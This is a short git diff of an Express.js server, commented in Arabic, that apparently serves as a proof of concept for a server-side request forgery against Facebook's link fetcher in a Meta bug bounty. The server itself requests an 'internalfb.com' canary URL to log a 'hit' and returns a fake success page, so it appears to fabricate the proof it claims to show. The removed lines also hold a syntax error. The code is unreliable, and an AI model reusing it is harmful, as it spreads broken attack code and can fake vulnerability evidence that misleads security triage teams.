@@ -1,17 +1,18 @@
 const express = require('express');
-const axios = require('axios'); // مكتبة لجلب البيانات بالخلفية
+const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-app.get('/image.gif', async (req, res) => {
+// تعديل المسار ليكون الصفحة الرئيسية مباشرة لتتوافق مع نظام جلب البيانات في فيسبوك
+app.get('/', async (req, res) => {
     try {
-        // 1. نجبر السيرفر على زيارة رابط الكناري في الخلفية لتسجيل الـ Hit فوراً
-        await axios.get('https://internalfb.com', { timeout: 3000 }).catch(() => {});
+        // 1. إجبار السيرفر على طلب رابط الكناري داخلياً بالخلفية لتسجيل الـ Hit فوراً
+        await axios.get('https://internalfb.com', { timeout: 4000 }).catch(() => {});
         
-        // 2. نقوم بتحويل السيرفر لصورة الجيف الحقيقية من جوجل درايف لنجاح العملية أمامه
-        res.redirect(302, https://drive.google.com/file/d/1lxUeSqus_QpqXX73pZLs8HtwPdL0gQJS/view?usp=drivesdk');
+        // 2. إرجاع كود نجاح لفيسبوك وصورة وهمية لكي يقبل الرابط برمز 200 سليماً
+        res.status(200).send('<html><head><title>Meta Bug Bounty PoC</title></head><body><img src="https://google.com"/></body></html>');
     } catch (error) {
-        res.redirect(302, 'https://drive.google.com/file/d/1lxUeSqus_QpqXX73pZLs8HtwPdL0gQJS/view?usp=drivesdk');
+        res.status(200).send('Success');
     }
 });
 
